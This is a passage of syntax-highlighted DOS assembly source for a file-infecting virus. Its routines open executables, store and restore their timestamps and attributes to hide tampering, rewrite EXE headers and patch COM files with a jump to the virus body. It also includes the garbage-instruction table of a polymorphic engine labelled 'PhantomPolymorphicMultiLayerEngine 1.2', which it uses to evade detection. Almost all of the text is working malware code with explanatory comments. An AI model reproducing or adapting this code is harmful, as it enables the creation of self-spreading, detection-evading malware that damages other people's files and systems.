         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">lod_fil_exit</span><span class="sc0">    </span><span class="sc1">; Error? Jump to lod_fil_exit</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3d02h</span><span class="sc0">        </span><span class="sc1">; Open file (read/write)</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
         </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">       </span><span class="sc1">; BX = file handle</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">lod_fil_exit</span><span class="sc0">    </span><span class="sc1">; Error? Jump to lod_fil_exit</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">          </span><span class="sc1">; Save DX at stack</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5700h</span><span class="sc0">        </span><span class="sc1">; Get file's date and time</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">file_date</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">   </span><span class="sc1">; Store file's date</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">file_time</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">   </span><span class="sc1">; Store file's time</span><span class="sc0">

         </span><span class="sc6">clc</span><span class="sc0">             </span><span class="sc1">; Clear carry flag</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">          </span><span class="sc1">; Load DX from stack</span><span class="sc0">

         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">sto_file_inf</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Store file information</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">          </span><span class="sc1">; Save DX at stack</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5701h</span><span class="sc0">        </span><span class="sc1">; Set file's date and time</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">file_time</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; CX = new time</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">file_date</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; DX = new date</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3eh</span><span class="sc0">      </span><span class="sc1">; Close file</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">          </span><span class="sc1">; Load DX from stack</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0">        </span><span class="sc1">; Set file attributes</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">file_attr</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; CX = new file attributes</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">prepare_exe</span><span class="sc0">  </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Prepare EXE infection</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">          </span><span class="sc1">; Save SI at stack</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">       </span><span class="sc1">; Save registers at stack</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">200h</span><span class="sc0">         </span><span class="sc1">; Divide by pages</span><span class="sc0">
         </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">          </span><span class="sc1">; DX:AX = filesize in pages</span><span class="sc0">
         </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Increase total number of 512-pag...</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">file_header_</span><span class="sc4">+</span><span class="sc2">04h</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">internal_ove</span><span class="sc0">    </span><span class="sc1">; Internal overlay? Jump to intern...</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">file_header_</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">internal_ove</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; Load registers from stack</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">pre_exe_exit</span><span class="sc0">    </span><span class="sc1">; Internal overlay? Jump to pre_ex...</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">file_header_</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">04</span><span class="sc0">       </span><span class="sc1">; Multiply by paragraphs</span><span class="sc0">
         </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">       </span><span class="sc1">; SI = header size</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">       </span><span class="sc1">; Subtract header size from filesize</span><span class="sc0">
         </span><span class="sc6">sbb</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">      </span><span class="sc1">; DX:AX = filesize - header size</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">      </span><span class="sc1">; Divide by paragraphs</span><span class="sc0">
         </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">          </span><span class="sc1">; DX:AX = initial CS:IP releative ...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">file_header_</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">file_header_</span><span class="sc4">+</span><span class="sc2">16h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">file_header_</span><span class="sc4">+</span><span class="sc2">0eh</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">file_header_</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">],</span><span class="sc2">6bb3h</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">       </span><span class="sc1">; AX = decryptor's offset</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">          </span><span class="sc1">; Load SI from stack</span><span class="sc0">

         </span><span class="sc6">clc</span><span class="sc0">             </span><span class="sc1">; Clear carry flag</span><span class="sc0">

         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return</span><span class="sc0">
</span><span class="sc5">pre_exe_exit</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">          </span><span class="sc1">; Load SI from stack</span><span class="sc0">
</span><span class="sc5">pre_com_exit</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">stc</span><span class="sc0">             </span><span class="sc1">; Set carry flag</span><span class="sc0">

         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">prepare_com</span><span class="sc0">  </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Prepare COM infection</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0a831h</span><span class="sc0">       </span><span class="sc1">; Filesize too large?</span><span class="sc0">
         </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">pre_com_exit</span><span class="sc0">    </span><span class="sc1">; Above? Jump to pre_com_exit</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Save AX at stack</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">file_header_</span><span class="sc4">],</span><span class="sc2">11101001b</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">      </span><span class="sc1">; AX = offset of virus within infe...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">virus_offset</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">   </span><span class="sc1">; Store offset of virus within inf...</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Load AX from stack</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">         </span><span class="sc1">; AX = decryptor's offset</span><span class="sc0">

         </span><span class="sc6">clc</span><span class="sc0">             </span><span class="sc1">; Clear carry flag</span><span class="sc0">

         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">infect_exe</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Infect EXE executable</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">filesize</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">filesize</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc5">poly_total_lenght</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">adc</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">      </span><span class="sc1">; DX:AX = filesize + length of dec...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">200h</span><span class="sc0">         </span><span class="sc1">; Divide by pages</span><span class="sc0">
         </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">          </span><span class="sc1">; DX:AX = filesize in pages</span><span class="sc0">
         </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Increase total number of 512-pag...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">file_header_</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">file_header_</span><span class="sc4">+</span><span class="sc2">04h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

</span><span class="sc5">infect_com</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Infect COM executable</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">        </span><span class="sc1">; Set current file position (SOF)</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">set_file_pos</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">      </span><span class="sc1">; Write to file</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1ah</span><span class="sc0">      </span><span class="sc1">; Write twenty-six bytes</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">file_header_</span><span class="sc0">     </span><span class="sc1">; DX = offset of file_header_</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

         </span><span class="sc6">clc</span><span class="sc0">             </span><span class="sc1">; Clear carry flag</span><span class="sc0">

         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">

         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'"PhantomPolymorphicMultiLayerEngine 1.2"'</span><span class="sc0">

</span><span class="sc1">;   table interpretation</span><span class="sc0">
</span><span class="sc1">;  each entry is composed by an information byte and some data bytes. the</span><span class="sc0">
</span><span class="sc1">; information bytes contains the number of data bytes the entry has and</span><span class="sc0">
</span><span class="sc1">; the type of instruction. it is based on the data in the lower nibble</span><span class="sc0">
</span><span class="sc1">; using this scheme:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; ÚÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">; ³ value ³ data bytes  ³    subroutine called to generate this instruction   ³</span><span class="sc0">
</span><span class="sc1">; ÃÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´</span><span class="sc0">
</span><span class="sc1">; ³   0   ³  1  ³      routines_various_memoff_or_rr              ³</span><span class="sc0">
</span><span class="sc1">; ³   1   ³  1  ³      routines_copy_one_plus_imm             ³</span><span class="sc0">
</span><span class="sc1">; ³   2   ³  2  ³      routines_math_with_immediate           ³</span><span class="sc0">
</span><span class="sc1">; ³   3   ³  2  ³      routines_manage_math_twobytes              ³</span><span class="sc0">
</span><span class="sc1">; ³   4   ³  1  ³      routines_one_byte_16reg                ³</span><span class="sc0">
</span><span class="sc1">; ³   5   ³  1  ³      routines_copy_one_byte                 ³</span><span class="sc0">
</span><span class="sc1">; ³   6   ³  2  ³      routines_copy_one_word                 ³</span><span class="sc0">
</span><span class="sc1">; ³   7   ³   high nib  ³      routines_copy_many_bytes               ³</span><span class="sc0">
</span><span class="sc1">; ³   8   ³  1  ³      routines_manage_jumps                  ³</span><span class="sc0">
</span><span class="sc1">; ÀÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  if the value of the low nibble is not 7 (in which case the high nibble</span><span class="sc0">
</span><span class="sc1">; contains the lenght of the data bytes) in the high nibble a comptability</span><span class="sc0">
</span><span class="sc1">; number is stored. this number is used when the garbage to be generated has</span><span class="sc0">
</span><span class="sc1">; to be from a certain fixed set and is used by the get_instr_with_compat</span><span class="sc0">
</span><span class="sc1">; routine. in that case only the table entries that has a high nibble that has</span><span class="sc0">
</span><span class="sc1">; some specific bits triggered will be considered as possible garbage</span><span class="sc0">
</span><span class="sc1">; entries candidates. (ie. compat of 0fh mean nothing is changed)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">i_table_start</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">40h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">10h</span><span class="sc0"> </span><span class="sc1">; adc reg,reg or from mem</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">41h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">14h</span><span class="sc0"> </span><span class="sc1">; adc reg,imm (ax/al only)</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">42h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">80h</span><span class="sc0"> </span><span class="sc1">; adc reg,imm</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">10h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">60h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; adc reg,reg or from mem</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">61h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc1">; add reg,imm (ax/al only)</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">62h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">80h</span><span class="sc0"> </span><span class="sc1">; add reg,imm</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">60h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">20h</span><span class="sc0"> </span><span class="sc1">; and reg,reg or from mem</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">61h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">24h</span><span class="sc0"> </span><span class="sc1">; and reg,imm (ax/al only)</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">62h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">80h</span><span class="sc0"> </span><span class="sc1">; and reg,imm</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">20h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">95h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">clc</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">95h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">95h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">cli</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">95h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">cmc</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">90h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">38h</span><span class="sc0"> </span><span class="sc1">; cmp reg,reg or from mem</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">91h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">3Ch</span><span class="sc0"> </span><span class="sc1">; cmp reg,imm (ax/al only)</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">92h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">80h</span><span class="sc0"> </span><span class="sc1">; cmp reg,imm</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">38h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">24h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">48h</span><span class="sc0"> </span><span class="sc1">; dec register 16 bit</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">63h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0FEh</span><span class="sc0"> </span><span class="sc1">; dec register</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">8</span><span class="sc0"> </span><span class="sc1">; used for reg</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">27h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">in</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">61h</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">44h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">40h</span><span class="sc0"> </span><span class="sc1">; inc register 16 bit</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0FEh</span><span class="sc0"> </span><span class="sc1">; inc register</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; used for reg</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">47h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">30h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">     </span><span class="sc1">; DOS - GET DOS VERSION</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">47h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2Ah</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">     </span><span class="sc1">; DOS - GET CURRENT DATE</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">47h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2Ch</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">     </span><span class="sc1">; DOS - GET CURRENT TIME</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">47h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">19h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">     </span><span class="sc1">; DOS - GET DEFAULT DISK NUMBER</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">67h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">35h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">     </span><span class="sc1">; DOS - GET INTERRUPT VECTOR</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">


        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">77h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">48h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFh</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">     </span><span class="sc1">; DOS - ALLOCATE MEMORY</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">8</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc2">77h</span><span class="sc0"> </span><span class="sc1">; ja</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">8</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc2">73h</span><span class="sc0"> </span><span class="sc1">; jnb</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">8</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
